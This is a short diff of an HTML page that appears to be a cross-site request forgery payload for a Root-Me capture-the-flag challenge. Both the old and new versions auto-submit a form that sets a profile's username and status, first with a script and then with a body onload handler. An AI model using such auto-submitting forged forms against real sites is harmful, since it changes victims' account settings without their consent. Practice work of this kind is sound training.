@@ -3,11 +3,11 @@
 <head>
 	<title>Page Title</title>
 </head>
-<body>
-	<form name="myform" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
-		<input type="hidden" name="username" value="badrey" />
-		<input type="hidden" name="status" value="1" />
+<body onload="document.myform.submit()">
+	<form name="myform" action="?action=profile" method="post" enctype="multipart/form-data">
+		<input type="text" name="username" value="badrey" />
+		<input type="checkbox" name="status" checked />
+		<input type="submit" value="go" />
 	</form>
-	<script>document.myform.submit();</script>
 </body>
 </html>
